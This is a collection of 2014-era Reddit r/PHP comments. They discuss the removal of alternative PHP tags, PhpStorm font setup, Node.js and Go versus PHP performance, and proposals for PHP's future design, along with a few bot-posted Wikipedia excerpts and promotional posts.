Maybe I'm reading this wrong. But does this mean that &lt;?=$chickenLips?&gt; will be removed?
I've managed to get the fonts to look pretty nice. I am using Oracle JDK 8, and have setup a bunch of extra options in the vm options file. I've also got Font Forge for removing hints and instructions on fonts and that made a huge difference to how they looked. I was just after the UI font that's used on OS X because I think it looks a bit better than my current choice of font. :)
So that's a no then.
No. They only just made that standard and separate from the normal short tags &lt;? ?&gt;
I've not really used NodeJs in production, so really have no clue what it's right for. From what I've read, reactPHP can probably do the exact same thing as NodeJS albeit a little slower, but not by much, although it may use more resources. I might have worded the title wrong. Sorry :) 
Yes. The clarity of the language itself. Needless complexity and inconsistency is a bad thing.
Even better, you can mix and match! &lt;script language="php"&gt;echo 'stuff' %&gt;
To my understanding, React is a fairly immature solution to solving a problem that PHP is not great at, whereas Node is particularly good in this kind of case.
Another big benefit of non-compiled templates is that when PHP spits out an error, it's a lot easier to trace because the code and line number referenced will be something you actually wrote, whereas when an error comes out of a compiled PHP script you have to go through a guess-and-check process to determine what input code caused it
http://reactphp.org/
Get the best PHP training in Ludhiana from IT Gurukul the best IT training institute.IT Gurukul provides the best Industrial training in PHP in Ludhiana. 
The OS X UI font is [Lucida Grande](https://en.wikipedia.org/wiki/Lucida_Grande). The code font is [Menlo](http://www.leancrew.com/all-this/2009/10/the-compleat-menlovera-sans-comparison/).
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Lucida Grande**](https://en.wikipedia.org/wiki/Lucida%20Grande): [](#sfw) --- &gt; &gt;__Lucida Grande__ is a [humanist](https://en.wikipedia.org/wiki/Sans-serif#Classification) [sans-serif](https://en.wikipedia.org/wiki/Sans-serif) [typeface](https://en.wikipedia.org/wiki/Typeface). It is a member of the [Lucida](https://en.wikipedia.org/wiki/Lucida_(font\)) family of typefaces designed by [Charles Bigelow](https://en.wikipedia.org/wiki/Charles_Bigelow_(type_designer\)) and [Kris Holmes](https://en.wikipedia.org/wiki/Kris_Holmes). It has been used throughout [Mac OS X](https://en.wikipedia.org/wiki/Mac_OS_X) [user interface](https://en.wikipedia.org/wiki/Graphic_user_interface) from 1999 to 2014, as well as in [Safari](https://en.wikipedia.org/wiki/Safari_(web_browser\)) for [Windows](https://en.wikipedia.org/wiki/Microsoft_Windows) up to the browser's version 3.2.3 released on 12 May 2009. As of OS X 10.10 Yosemite, the system font was changed from Lucida Grande to Helvetica Neue. &gt;The typeface looks very similar to [Lucida Sans](https://en.wikipedia.org/wiki/Lucida_Sans) and [Lucida Sans Unicode](https://en.wikipedia.org/wiki/Lucida_Sans_Unicode). Like Sans Unicode, Grande supports the most commonly used characters defined in version 2.0 of the [Unicode](https://en.wikipedia.org/wiki/Unicode) standard. &gt;Three weights of Lucida Grande: Normal, Bold, and Black, in three styles: Roman, Italic, and Oblique, were developed by Bigelow &amp; Holmes. Apple released the Regular (Normal Roman) and Bold Roman with OS X. &gt;==== &gt;[**Image**](https://i.imgur.com/pKkkm5y.png) [^(i)](https://commons.wikimedia.org/wiki/File:LucidaGrandeSpecAIB.svg) --- ^Interesting: [^Lucida ^Sans ^Unicode](https://en.wikipedia.org/wiki/Lucida_Sans_Unicode) ^| [^Sans-serif](https://en.wikipedia.org/wiki/Sans-serif) ^| [^List ^of ^typefaces](https://en.wikipedia.org/wiki/List_of_typefaces) ^| [^Kris ^Holmes](https://en.wikipedia.org/wiki/Kris_Holmes) ^Parent ^commenter ^can [^toggle ^NSFW](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+ckybifd) ^or[](#or) [^delete](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+ckybifd)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
You're a monster
Thanks, I've watched a few now and they seem really good. I'll check more out when I get home from work.
Thank you very much! :)
That's a pretty good reason.
It's exciting to witness a language such as this one improve day by day. Remove clutter, introduce more modern features, bork some compatibility, improve speed... and there you have it. A delicious amalgamation.
not sure about other templating systems but this argument is not valid for twig. Twig gives you error message with precise line number in template file.
The answer to the question is unequivocally yes but it is not the right question. The right question is, did these tags (optionally: ever) add any value to the language? In 2014, the answer to that question is no.
The problem with such a definition is that it doesn't transfer much between companies. If company A is doing very simplistic things in a single CMS, and there is someone really good at those things, and even has some subordinates, the company might call him senior. But as soon as he looks for a new job in company B, that does things in a different CMS he's suddenly not senior anymore. What I attempt is to underline some general knowledge that is independant of the current company. Consider this: If your definition is true, then when companies put a job opening for a "senior dev" that would tell nothing to a candidate. Since because you havent worked at that company yet, you have no idea what their "Senior" means. 
It's a dry heat, and PHP is better when it's DRY.
That was terrible. Sorry.
Right, and this is how it should be. If you're suddenly not senior anymore, then you lack the experience in this particular branch, which is perfectly fine. Working for a marketing company is a entirely different world than working for lets say a service provider.
I remember some bullshit php skills test I took for a contracting firm, one of the questions was "Which one of these tags will always invoke the PHP interpreter?" To which the answer was the &lt;script language="php"&gt; one. In my eight years of web development experience, I've never seen it used once. Much like magic quotes and register globals, the language will be better off without these.
Well so when I see a tweet like "Looking for a senior PHP dev in some area" what do they mean by that?
Somehow I'm not surprised that Derrick voted against it...
#3 - I think you want this plugin: http://plugins.jetbrains.com/plugin/index?pr=&amp;pluginId=7055 It takes the code theme and applies it to the sidebars and windows. #5 - I wrote about my experiences when I switched back in January: http://ericlbarnes.com/switching-to-phpstorm/ 
I've tinkered with the VM options, but not found much difference in font rendering. Can you share your changes?
Yes node has a place in production, it's used by some absolutely massive companies, including PayPal, Walgreens etc. It's uses over PHP are, it's (largely) non-blocking. Meaning it doesn't have to wait for each function to finish before executing the next. It has what's called an 'event loop' which constantly listens for events to start and finish, when they finish, it fires a callback method. That mean's node's often the language of choice for asynchronous applications, or performance critical applications. 
There are a few IntelliJ theme sites. [Such as this one.](http://www.phpstorm-themes.com/) I don't think you can change the UI colours but you can change all of the panels. Make sure you install the ColourIDE plugin from the repositories to make the themes apply everywhere.
Hmm, for no. 3 - is it possible to make it a different color to the background of the code editing window? I have already read your article actually, there were a couple of things I picked up from it, so thanks! :)
Fair enough, I'm sold. Guess I should have an evening looking into it. Thanks. 
Hi, I love Wordpress mainly because of 3 things - https://wordpress.com/ * Plugins * Ease of Use * Hosting Big Players Drupal - https://www.drupal.org/ Joomla - http://www.joomla.org/ Medium Players Expression Engine - https://ellislab.com/expressionengine Small Players PicoCMS - http://picocms.org/ Pagekit - http://www.pagekit.com/ Hope This Helps
My current phpstorm64.vmoptions file can be found here: https://gist.github.com/SeerUK/ff6ab9022149f1ee7f98 * I'm on Ubuntu 14.04 - 64-bit. * Oracle Java 8. * My UI font is currently Myriad Pro Semibold which I stole from having Photoshop on Windows, size 12. * My editor font is Meslo LG L size 12 with 1.0 line spacing. I also have Jayatana installed to make the top menu part of the Unity toolbar. I also have the CodeGlance plugin installed. All in all, it has ended up looking like this: http://i.imgur.com/aS8jMJ6.png But, I'm not done yet! Though I have ticked off most of the items in my list for being 100% happy with PhpStorm. I hope that helps. :)
I... I cannot believe this actually runs. I am glad this has not been more publicly advertised, the only alternate tags I've ever read about was the shorthand open and close.
&gt; I did not develop the PHP we know today. Dozens, if not hundreds of people, developed PHP. I was simply the first developer. - Rasmus Lerdorf also... &gt; I'm not a real programmer. I throw together things until it works then I move on.
I assert that adding a Trait to do Domain work so it can be mixed in with the Action work is a mixing of concerns. We want the Action code to be pretty dumb. Also, using Traits in this way will (IMO) lead to a poorly separated Domain overall.
I really wish somebody who voted 'No' would be willing to explain their vote. The only downside I can think of is that a small number of scripts would break that were doing stupid things. Even then, someone could create a script to fix the small number of stupid scripts. Thanks /u/nikic for putting this together.
How would you deal with rfc requests? 
My apologies for not answering the question. However, it seems like you're approaching this in an ill advised manner. First determine the right tool for the right job. Then let that decide your other variables. So, determine the right CMS, CMF, or whatever. That will determine the language. The CMS or whatever else will likely work best (or be more tested) with a back end (usually RDBMS). The CMS or whatever will likely work best (or be more tested) with an operating system.
I assume because that code opens a rift in reality to a dimension of madness and chaotic evil.
Check out this variation: https://github.com/andreberg/Meslo-Font I really like dot-zeros.
Might well be concerned about code using the old tags. Not that it should be hard to update, but that may be their concern?
1. Meslo DZ: https://github.com/andreberg/Meslo-Font 2. Preferences -&gt; File and Code Templates *You can remove the part where it adds the Namespace to new files.* 3. Not fully supported or endorsed. 4. Depends on what you do. It now has WordPress and Symfony support. But there is also a more in-depth Symfony plugin still available. Just start searching the plugin site or via PhpStorm. 5. Tied to 4, you can get a plugin called CodeGlance that does that thing on the side. Preferences -&gt; Keymap *You might be able to change some keymaps to be more familiar.* 6. No, but what is handy is Scroll to/from Source. With the project file panel open click the gear and select one or both. 7. Not that I know of. You will learn to love it. Really dig in and play around. Live/Code templates can be very powerful. The database viewer is nice if you need some low-level tools. xDebug is amazeballs. Git integration is good but not 100%. The way it does specific things or words actions has to be figured out. It also supports Vagrant, Composer, Emmit, and so many other things. Enjoy.
&gt;Is there any way of getting the sidebar to open folders with a single click? There should be an arrow next to the folder, which should expand it in just one click. That's the only way I know how to do it purely out of habit.
From my solicitation experience.. Someone that has been through the process of writing disposable code; someone that doesn't make bad design choices anymore; one who's code is a foundation for more code; again, someone who knows out of *experience* which decisions to make, they dont give a penny about how well u know MongoDB. And your experience is totally dependent on 'some area' ofcourse
&gt; if ( $_SERVER['REQUEST_METHOD'] == 'POST' &amp;&amp; strpos($_SERVER['CONTENT_TYPE'], 'application/json') === 0 ) { &gt; $postdata = file_get_contents('php://input'); &gt; $_POST = json_decode($postdata, true); &gt; $_REQUEST = array_merge($_REQUEST, $_POST); &gt; } I just put this at the top, maybe that's the wrong place to put it, but the values still came out blank. Am I using it wrong? 
Thanks for writing that stuff up :) I'm quite happy in an actual terminal with a lot of things, so support for Vagrant, Composer, Git, and the like is useless (and aside from the Git support I've disabled a lot of the things like that, at least for now). I'm mainly happy to use it for the code-related functionality, refactoring, real code intelligence that works, error detection, unused variable detection, automatically putting namespaces in, so on - I am liking it a lot already, and have managed to get quite a few of the keybindings the same. I'd say, the only things I'm not 100% on so far is the lack of UI theme support, and that it's not quite as fast as Sublime - however I think I'll learn to be happy with the appearance, as it is good looking, just not as good looking as Sublime, and the performance - well, I'll just get used to that, it should be worth the trade-off for the extra features I guess!
that was the biggest thing, I know wordpress can work on IIS, but I've been trying to find the best solution. I might look into expression engine or something similar. and just let views take care of it.
This was Microsoft's idea. It works for classic ASP too. The 90's were wild times for embedding code in HTML. 
https://github.com/ahadb/flat-file-cms has a list of flat file CMS. Unfortunately can't recommend one, since I haven't tested any on IIS, don't know which will work on IIS. However have a look, some flat file CMS allow to *include text blocks* on different pages.... hope this helps.
backwards compatability
You can try https://semaphoreapp.com. It has full support for PHP — can autoconfigure the project without any changes in source code and cache your dependencies, with support for automatic deployment as well. Builds run much faster than on Travis, depending on your test suite size, see https://gist.github.com/kurko/10024698. No support for Github Enterprise though yet. Disclaimer: I'm a cofounder.
Keeping the tags makes the language more complex to maintain. The more things you have the more they are likely to break. Example: http://www.reddit.com/r/PHP/comments/2i21ko/rfc_to_remove_alternative_php_tags_accepted_for/cky878s Would you consider that good and expected behavior?
Apology accepted.
&gt; ownCloud is one of the biggest open source project written in PHP if you look into the latest statistics. yeah, no. Not by pretty much any metric...
You should view [this screencast](https://laracasts.com/series/how-to-be-awesome-in-phpstorm) from Jeffrey Way.
I'd say removing wtfs (which PHP has no shortage of) is good enough reason to break BC *in a major version*.
I would like to know also, if Golang is currently the best solution for building the fastest web app. 
TLDR: &gt; Here are a few ideas for improvements that I would love to see: &gt; &gt; * Security. Kill the _GET and _POST and _SERVER arrays and introduce a proper API that can be used to filter all incoming data. &gt; * Database. PHP support a ton of different database API. Some of them are very old but they are inconsistent to use. Everything should be standardized so that only one OO interface exists. I personally would use PDO as a starting-point here. &gt; * 32bit / 64bit. Anyone who ever tried to write a PHP application that runs on 32bit or 64bit operating-systems will recognize that variables especially integers behave differently. I understand that this is a reminiszense to C/C++ but this is seriously a bad idea. I don´t want to have different code paths which have to be tested independently. &gt; * kill safe_mode, open_basedir and other acient concepts &gt; * Remove most of the compile and runtime config options. All PHPNEXT runtime environments should be as similar and stable as possible. &gt; * Typing. It would be cool if PHP would introduce optional static typing. So that a variable can be declared as, for example, bool or int. An exception should be thrown if used otherwise. &gt; * Always use unicode strings I agree with all of them.
&gt;Security. Kill the _GET and _POST and _SERVER arrays and introduce a proper API that can be used to filter all incoming data. Why "kill" them? I'm all for having a fancier OO interface to handle request data, but there's nothing wrong with having those superglobal arrays available as convenient shorthands for those of us who know that $_POST['num-items'] will sometimes come in as 'LOLBUTTS' and already have something in place to handle that stuff. &gt;Database. PHP support a ton of different database API. Some of them are very old but they are inconsistent to use. Everything should be standardized so that only one OO interface exists. I personally would use PDO as a starting-point here. No. Just no. Standardized APIs like PDO are nice, but they come with a lot of sacrifices. Libraries like mysqli give you much more control over how you interface with the database, enabling a lot of performance optimizations and introspection you just can't get in PDO. I'd actually prefer if there were a way to optionally access all of the mysqli methods directly from within a MySQL PDO object (and same with PostgreSQL, etc.), for those cases where optimizations are worth doing some driver-specific code. &gt;32bit / 64bit. Anyone who ever tried to write a PHP application that runs on 32bit or 64bit operating-systems will recognize that variables especially integers behave differently. I understand that this is a reminiszense to C/C++ but this is seriously a bad idea. I don´t want to have different code paths which have to be tested independently. Agreed. These days, it would be best if PHP always behaved as though you were on a 64-bit OS. Most servers should be anyway. &gt;kill save_mode, open_basedir and other acient concepts Maybe I haven't been keeping up-to-date, but I thought open_basedir was still effective as long as you disable all functions that provide loopholes (things like system, shell_exec, etc.). I would suggest keeping open_basedir support, but having it *automatically* disable those functions from an internal master list, so it can serve as a convenient file-level sandbox. This would help protect sites from each other in a virtual hosted environment. &gt;Remove most of the compile and runtime config options. All PHPNEXT runtime environments should be as similar and stable as possible. It would be nice to have some more guarantees as far as the availability of certain modules, syntax (like the whole shorttag and asptag stuff that they seem to be sorting out now), and other features that commonly lead to portability issues. But I don't know about removing "most" of the config options. &gt;Typing. It would be cool if PHP would introduce optional static typing. So that a variable can be declared as, for example, bool or int. An exception should be thrown if used otherwise. I have mixed feelings about this. This is one of those things that would completely change how people write PHP code, and I don't think that static typing really fits into how PHP works. I'm all for allowing type hints in function definitions (and I'm a huge fan of the [auto-cast hinting proposal](https://wiki.php.net/rfc/parameter_type_casting_hints)), but having some variables floating around that are intrinsically strongly-typed seems problematic to me. &gt;Always use unicode strings No. PHP's binary strings are more powerful, since they can store any arbitrary data, and they can also be handled perfectly well as unicode as long as you're using the appropriate functions for that. I do a lot of programming in PHP and JavaScript, and JavaScript's use of unicode strings is infuriating at times (although that's largely because, until just recently, JavaScript had no efficient data structure for binary data). There are performance optimizations that can be made if the language knows ahead of time that a string has a particular multibyte encoding, so I'm not against having support for natively unicode strings. However, I think they should be implemented as a different data type, and binary strings should still be supported the same as before.
... and Anthony, how is this a useful comment? Do you really think it contributes to the discussion? I realize people complaining (constructively even!) about PHP make internals folks (which I still consider you to be) all butthurt and offended, but come on, we are not angsty teenagers here...
I thought that was a very bold statement as well. I wonder what these "latest statistics" are. 
Never trust a benchmark that you haven't run yourself. PHP doesn't do very well at optimizing on the first pass (something that Node.js via v8 is good at, and Go is a compiled language). I think in order to get more reasonable 'in the wild' numbers you'd have to run the PHP a few times with an opcache enabled. I'm pretty sure that number would be cut in half. It's likely that the two languages are faster than PHP, but as Phil Sturgeon [pointed out](https://philsturgeon.uk/blog/2013/11/benchmarking-codswallop-nodejs-v-php), it's PHP's lack of concurrency that kills it in your typical benchmark.
It's weird, it will log out everything to the console when it's run through my IDE, but I've tried on two separate websites and it doesn't log out there.. Same exact code
https://www.reddit.com/r/PHP/comments/2i3e1i/a_possible_future_for_php/ckygua6 "+1" ps: I'm a jerk
It gives insight into the perspectives being shown. Someone who really believes that their project of choice is one of the biggest written in PHP clearly hasn't looked at many of the **absolutely massive** projects that already exist. That tells me something about what to expect. And to take what's said with a grain of sand. &gt; I realize people complaining (constructively even!) about PHP make internals folks (which I still consider you to be) all butthurt and offended, but come on, we are not angsty teenagers here... Who said anything about being butthurt or offended? Some of the concepts that were presented I agree with, some I think could only work in an ideal world, and some I don't care for. But there's nothing "butthurt" about it.
any suggestions on how to solve these problems?
&gt; Who said anything about being butthurt or offended? Some of the concepts that were presented I agree with, some I think could only work in an ideal world, and some I don't care for. But there's nothing "butthurt" about it. The "butthurt" comes from the fact that instead of critiquing the *content* of the article, you cherry-picked a single, irrelevant line and focused on the the author considering a particular project to be big. To me, this sounds like *"Author of tiny irrelevant project criticizes my work which he is not important enough to do, so I'm offended"*.
I don't think i need it for PDO, I meant something along the lines of: why is memcache nog included on default and something like pdo is
There's a **huge** difference between considering a project to be "big" and saying it's one of the biggest in the world. And no, he didn't criticize my work. And he didn't offend me. In any way. It does hint towards an effect I've seen before though. When interviewing developers, if you ask them to rate their skill on a scale of 1-10, many juniors that we interviewed would say 8-9. But when we interviewed them in person, it was clear that they were no more than a 3-4 (and they admitted it). The reason for the bias was that they had never really worked on a team with better developers. So they didn't know what they didn't know. This is a manifestation of [Dunning Kruger](http://en.wikipedia.org/wiki/Dunning%E2%80%93Kruger_effect). And to me, that's what popped into my head when I read that first line. It was an appeal to authority at the very first line of the post, which stated something that feels just like that "1-10" experience from above. And that set the tone for the whole article **to me**. 
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Dunning–Kruger effect**](https://en.wikipedia.org/wiki/Dunning%E2%80%93Kruger%20effect): [](#sfw) --- &gt; &gt;The __Dunning–Kruger effect__ is a [cognitive bias](https://en.wikipedia.org/wiki/Cognitive_bias) manifesting in unskilled individuals suffering from [illusory superiority](https://en.wikipedia.org/wiki/Illusory_superiority), mistakenly rating their ability much higher than is accurate. This bias is attributed to a [metacognitive](https://en.wikipedia.org/wiki/Metacognition) inability of the unskilled to recognize their ineptitude. Conversely, people with true ability tend to underestimate their relative competence based on the erroneous or exaggerated claims made by unskilled people. &gt;David Dunning and Justin Kruger of [Cornell University](https://en.wikipedia.org/wiki/Cornell_University) conclude, "the miscalibration of the incompetent stems from an error about the self, whereas the miscalibration of the highly competent stems from an error about others". &gt; --- ^Interesting: [^Illusory ^superiority](https://en.wikipedia.org/wiki/Illusory_superiority) ^| [^Overconfidence ^effect](https://en.wikipedia.org/wiki/Overconfidence_effect) ^| [^Hanlon's ^razor](https://en.wikipedia.org/wiki/Hanlon%27s_razor) ^| [^Anosognosia](https://en.wikipedia.org/wiki/Anosognosia) ^Parent ^commenter ^can [^toggle ^NSFW](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+ckyi9z4) ^or[](#or) [^delete](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+ckyi9z4)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
Yes, also - as far as I know - he never opposed getting more people on board, getting more people in control/power, and he did not care if those people wanted a different PHP than himself. So, again, yes, it's great he contributed to the community at large, with the language, with the implementation, with his (limited) stewaradship.
As commenters have already explained, using count() inside a php loop is costly, and redundant if the array never changes.
&gt; PHP doesn't do very well at optimizing on the first pass [...] run the PHP a few times with an opcache enabled [...] PHP's lack of concurrency that kills it... None of that has anything to do with this benchmark. It's a single run, so the opcache won't matter, and it's not a concurrent benchmark. The difference is that Go is compiled, Node.js has a JIT, and vanilla PHP is intepreted. If he had run it using HHVM or phpng with JIT compilation, it would be a different story.
Just be careful about benchmark tests. He's basically saying. "Here's my sort in PHP, node, and golang. It's basically an exact port among all languages. Now let me test." I've used golang sparingly in side projects and admittedly it's nice, organized, and obviously performant due to it being compiled. That said the way that the array works in golang is not like PHP (obviously). In PHP it uses a hash table. http://nikic.github.io/2012/03/28/Understanding-PHPs-internal-array-implementation.html The idea of an array seems incredibly simple up front, but in the backend these two implementations serve different purposes. Arrays in PHP were meant to be flexible. For the PHP port. Using count() in the for loop isn't good practice. (as someone pointed out later in the comments). The types of array is obviously different, again keep that in mind. And php has a sort function. So pragmatically.... You ask. "I would like to know also, if Golang is currently the best solution for building the fastest web app." I like golang. Very few jobs out there at this moment. It is very performant due to various reason (compiled). It may not be the language to build "fastest web app" ever. I would not doubt the statement of "It's faster that PHP". Building the "fastest web app" may be painful though. PHP doesn't necessarily fill the role of "fastest web app" ever. Perhaps "one of the fastest dev time ever". This is certainly important when you start talking paychecks and billable hours.
That was meant as a joke. I was basically trying to get at the fact that you can be more productive in an environment that has the proper tools readily available, and I don't think that Go has those tools.
Or he only felt like commenting on one easily disprovable statement and didn't feel like getting involved with anything else? I hate when people make responses like yours. There is no law that says a comment has to address every single thing in an article (or parent comment). The person is free to only touch on what they want.
Ok haven't read the article but I'm going to guess the results. Go first because it executes byte code. Node JS second because it has a JIT compiler and the author is testing against PHP 5. This depends on the implementation of the code. If it has a lot of async stuff that is where I would expect node to shine but that wouldn't make much sense in a benchmark. Let's see if I'm right. Edit: Ding! Ding! Ding! We have a winner. Would be interested to see how HHVM or PHPNG perform though.
Here's an upvote for your benchmark bullshit filter being spot on.
Specifically the ecosystems that most "web" languages have. While there's stuff like Revel and Martini that cover the basics, there are undoubtedly dozens of packages/gems/eggs/modules/etc out there that offer basic, proven functionality that the Go ecosystem has yet to develop. (Also, while go-get is great, the fact that it doesn't handle version-pinning is maddening). That is to say that in 2 years Go very well might be a fantastic choice for developing a web app, but as of now it's wanting.
I would imagine the rationale is it doesn't hurt anything to leave it in as an option (but it should be disabled by default, which I believe it is already). But in this case it's probably best if it isn't even an option, but I can see why some would argue to just leave it.
I hope this is an indicator of their overall design direction to come. PHP5 has made many piecemeal efforts in minor version numbers (really starting in 5.2) to remove a lot of the WTF-ness from the language. There's been a huge push to keep things nicely organized and syntax pretty -- interfaces, namespaces, array shorthand, generators, etc. A major version number is a good opportunity to do syntax cleanup. I think hack's "Unsupported Features" page would be a good guide to use for syntax to drop: no more `and` `or` `xor` operators, `goto`, and variable variables (e.g. `$$foo`) would be the top of my list. Obviously not everything on that list is applicable, but they drop a lot of garbage and really clean the language up.
Look at how Wordpress (procedural mostly) or Drupal 8( more OOP) do it and design a more simple version. Or any CMS really, I like October https://octobercms.com/
On that plugin I don't believe you can do that, but you can do so much in PhpStorm I'm willing to bet you can. If you can just find out what that's called to search for it. I still struggle with their verbiage vs what I would call things. 
Birth Control
I don't think so. You can always wrap the *mixin* in a class and inject if needed, so really the only immediate challenge is conflicts in method names, but since the controller is "dumb" it shouldn't be a problem and I'm not seeing much of the domain argument when considering use Domain\Blog\BlogService; versus use Domain\Blog\CreateBlogServiceTrait; You're still programming to interfaces. Whatever it is, it has to be simple (including terminology). This is PHP. P.S, We really should be making *array(* and *abstract class* things of the past :-)
Why is it stupid for people to use things that are documented and up to this point a viable option? 
&gt; What i wanna do with it is that users of mine PHP-Application can write there own plugin/addon for the system and that the only thing they have to do upload it to a folder named plugins/addons The first step is to indeed make sure that this is ALL they have to do. These plugins should not have to be registered in a database. This is what Joomla does and they cease to be "plugins" because of it. It means you can't keep them in version control because they actually do need to be installed so they can register themselves in the extensions database. It's a huge pain in the ass and makes me depressed. 
You probably don't need a fully fledged CMS for that, unless you also need extra, more complex features. I think a ready made CMS might actually complicate things in your case. A coder can help you with a clean script for that, and it's not that complicated. (besides, I can hardly believe there's something ready made for IIS that does it). What you need is a small custom controller script that uses an url rewrite engine, and that can handle url aliases. Then whenever you need a new url pointing at the same content, you just add that alias url in the database and you're all set. In this case you can handle anything from whatever MySQL GUI you are using (I'm using SQLYog). By adding just a second file next to the controller (a template file), you can customize the page layout - so it matches the whole site content, and voila - you've got a mini CMS. I'm not into IIS work recently, switched to linux/apache/php years ago (and still glad about that), however if you get stuck and out of options, drop me a PM and perhaps we can arrange getting the script done for you.
&gt; No one is interested in cleaning up old mess. Nikita Popov proposed RFCs for cleaning up uniform variable syntax and removing alternative tags. Sara Golemon and I proposed one to remove multiple default clauses in a switch statement. Andrea Faulds has proposed several as well, such as trying to clean up integer conversion semantics. Are you sure no one is interested in cleaning up that old mess?
&gt; https://github.com/trending/developers?l=php&amp;since=daily That's interesting. I'd be curious to know what goes into it. Looking at the repo, 2600 stars. Which is non-trivial. It's [#40 by star count](https://github.com/search?l=PHP&amp;p=4&amp;q=stars%3A%3E1&amp;s=stars&amp;type=Repositories). Which is also not trivial... Interesting...
Before Candy
&gt; Kill the _GET and _POST and _SERVER arrays and introduce a proper API that can be used to filter all incoming data. This is something that OO people keep on insisting on, that PHP __NEEDs__ to have everything in an API to be a 'proper' web-server. That's nuts though - if you want to have the data accessed via an OO you can write your own 'proper' API to call the procedural functions and global vars. But it doesn't work the other way around. If you want to continue using the procedural functions and globals vars, then once it's wrapped up in a class it's not possible to wrap that in procedural function calls without introducing even more global state vars. The reason why I strongly think changing all the procedural functions to classes is wrong is that designing classes correctly for everyone to use everywhere is really, really fricking hard. It's not that hard to design the class for a few similar applications - but to have the class be designed correctly for everyone everywhere? Not at all easy. Having the functionality exposed through procedural functions allows people to compose their own OO apis that do precisely what they want the API to do...instead of attempting (and inevitably failing) to have the one true class in PHP. For the record there's not really any difference between doing `$x = $_POST['foo']` and `$x = getPost('foo');` - yes technically one is a global var, and then other is function but functionally they're interchangeable. A class based version isn't because `$request-&gt;getPost('foo')` requires you to start passing $request objects around in your code to be able to perform the call. 
I'm genuinely curious: why remove `and`, `or`, and `xor`?
Unfortunately people *use* the WTFs in their code. Break too many *in a single major version* and... well you get something like Perl 6 or Python 3. Note that I did vote to remove the alternative tags, but I can definitely respect why people would vote no to this or other RFCs attempting to clean up the language.
Honestly, those people *need* to be left behind. We absolutely cannot continue to cater to people who hang on to the past or we will never move forward.
I think you are confusing being against the superglobals with being "OO people / OO purists". I am perfectly fine with having procedural languages, PHP included. What I am **most definitely against** is **global mutable state**. It is evil. It is horrible. It is simply *wrong*. [This excellent SE discussion](http://programmers.stackexchange.com/questions/148108/why-is-global-state-so-evil) explains why.
&gt; What I am most definitely against is global mutable state. What's forcing you to mutate the global state?
What? I'm complaining about the language *having* global mutable state. I am most definitely not writing to the superglobals. The problem with the global state being mutable, is that because *anyone* can change it, you can't rely on it.
React does not change what PHP is designed to do. On the contrary, it goes against the grain by trying to do something it is not designed to do.
They do it ok.
You see, I can argue that those things are really superficial. And you can argue that we will eventually get there. But what I see is the development, while moving one step forward, takes two steps backward in a subtle manner. It is like a legacy project where fixing one bug creates another five...So while there is movement, I don't see much progress and so I don't think PHP is not going anywhere. I don't really care anymore. I have switched to python, and It seems ok.
php5-mysql isnt included by default, and memcache isnt either because not everyone uses it
83 upvotes and counting. Who the hell does really care about this?
Well, I guess his beef with it is that it is superfluous. &amp;&amp;, || and ^ (C-style) should be sufficient. I personally care way less about those than I do about the script tags.
&gt; takes two steps backward Why?
right arrow?
That's actually the one I'm using now :)
Hmmm, I suppose if I get used to using the keyboard to focus the sidebar (which would be a better idea anyway!) then this would work nicely. Cheers!
As I told, it is subtle. But [here](http://www.reddit.com/r/PHP/comments/2ejm7c/rfc_abstract_syntax_tree_ast_accepted_for_php_7/ck05cvt) is a something that might give you an idea.. 
What do you dislike about how they accomplish this? How could it be improved for everyone's use cases?
I wouldn't give much credit to the number of stars. Take a look at server side (maybe client) JS and the number of stars for the most popular repos. Also some people ask for "stars" on social media and maybe even use ghost accounts to do that, who knows. The point is, you can't really say that for every N stars there is N devs using something. If you use Google trends (don't) to search for popular PHP stuff, everything looks like a fart compared to wordpress. I don't even know what that means and I don't want to.
Although incomplete, https://github.com/soatok/furbb/blob/master/doc/plugins.md is one approach I haven't seen implemented before. \FurBB\make_shim('Foo', 'Arbitrary'); class AnythingReally extends Arbitrary_Shim { public function __construct(...$args) { parent::__construct(...$args); } } \FurBB\apply_shim('Foo', 'AnythingReally'); More will be documented, hopefully, before its 1.0 release.
Its not tailored for it, and honestly, the cron system is lacking in functionality. I don't use it anymore, in favor for upstart, but they could do more.
&gt; All for the sake of the code being easily usable with any framework and not having different style everywhere. Your coding style will have no impact on interop. The 0 and 4 autoloaders are fine, and people would be insane to ignore them. The 1 coding standard is fine because it's tiny and simple and based around what happens in the real world. The 3 logging interface standard is boring as hell but fine. But 2? I don't know a single developer that pays even more than token attention to it. PSR-2 goes way, way out of its way to control whitespace and newlines and whatnot when it didn't and shouldn't have to. It'd have been perfectly fine with the rest of the recommendations and leaving whitespace and newlines alone. Because it will have no impact on interop, you should not feel compelled to actually comply with PSR-2.
Seriously, Ramsus needs to grow a pair and start supporting changes forward for the good of everybody. The standard library is overoverdue for a massive cleanup.
`and`, etc. can do some bad things, e.g.: $truthiness = true and false; // true $truthiness = true &amp;&amp; false; // false The PHP "logical" operators were imported from Perl b/c Perl programmers ~~like~~ liked to do things like: important_operation() or die(); I would wager `and`, `or`, and `xor` are used incorrectly more often than they are used correctly.
The enormous amount of grammatical errors on that post prevented me from reading more than two paragraphs.
it IS complex that PHP currently has more than 1 way to start a script. and it is also inconsistent that some use &lt;?php and some use &lt;%
because its not the common standard, and has been on the chopping block for some time now.
